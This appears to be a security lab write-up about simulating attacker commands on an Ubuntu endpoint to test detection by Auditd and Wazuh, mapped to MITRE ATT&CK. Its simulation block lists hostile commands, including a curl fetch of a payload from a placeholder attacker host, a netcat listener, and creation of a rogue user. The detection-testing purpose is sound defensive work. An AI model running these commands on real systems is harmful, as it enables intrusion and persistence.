# Malicious Command Execution Investigation

## Incident Summary

Suspicious command execution activity was simulated on a monitored Linux endpoint to validate the effectiveness of Auditd and Wazuh in detecting potentially malicious command execution behavior.

The investigation focused on identifying unauthorized administrative activity, suspicious outbound commands, and high-risk shell operations.

---

## Alert Details

| Field | Value |
|---|---|
| Detection Source | Auditd |
| SIEM Platform | Wazuh |
| Endpoint | Ubuntu Agent |
| Activity Type | Suspicious Command Execution |
| Severity | Medium |

---

## Attack Simulation

The following commands were executed to simulate suspicious administrative and attacker-like behavior.

### Example Commands

```bash
sudo su
useradd attacker
chmod 777 sensitivefile
curl http://<attacker-ip>/payload.sh
nc -lvnp 4444
```

---

## Detection Workflow

1. Commands executed on monitored endpoint
2. Auditd captured command execution events
3. Wazuh agent forwarded logs to manager
4. Alerts generated within Wazuh dashboard
5. Investigation performed using collected telemetry

---

## Investigation Findings

The investigation identified several high-risk activities including:

- Privileged shell execution
- Unauthorized user creation attempts
- Suspicious permission modification
- External payload retrieval attempts

Auditd successfully logged command execution activity, including user context, timestamps, and executed binaries.

---

## MITRE ATT&CK Mapping


| Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter | T1059 |
| Execution | Unix Shell | T1059.004 |
| Persistence | Create Account | T1136 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## Evidence Collection

### Suspicious Command Execution
[Commands](../images/malicious-command.png)


### Wazuh Alert Details
[Alert Details](../images/auditd-alert-details.png)

---

## Security Impact

Malicious command execution may allow attackers to:

- Escalate privileges
- Create persistence
- Download malware
- Execute remote payloads
- Manipulate system configurations

Monitoring shell activity is critical for endpoint threat detection and forensic investigations.

---

## Recommendations

To strengthen command execution monitoring:

- Expand Auditd monitoring rules
- Create custom Wazuh correlation rules
- Monitor sensitive binaries
- Alert on suspicious outbound command usage
- Implement least-privilege access controls
- Restrict unauthorized administrative actions
